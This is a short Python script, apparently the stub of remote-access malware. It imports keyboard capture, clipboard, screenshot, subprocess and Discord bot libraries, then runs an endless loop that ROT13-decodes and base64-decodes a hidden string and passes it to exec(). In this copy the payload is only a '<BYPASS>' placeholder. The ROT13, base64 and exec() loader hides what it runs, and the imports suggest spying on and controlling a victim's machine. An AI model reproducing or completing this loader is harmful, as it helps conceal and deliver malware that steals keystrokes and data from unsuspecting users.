import os
import random
import threading
from time import sleep
from zipfile import ZipFile
import discord
import pyautogui
import requests
from discord.ext import commands
from keyboard import read_event
import base64
import codecs
import sys
import pyperclip
from subprocess import call
from playsound import playsound

while True:
    try:
        secert = "<BYPASS>"
        unsecret = codecs.encode(secert, 'rot13')
        exec(base64.b64decode({2:str, 3:lambda b:bytes(b, 'UTF-8')}[sys.version_info[0]](unsecret)))
    except:
        print("no code")
        sleep(20)
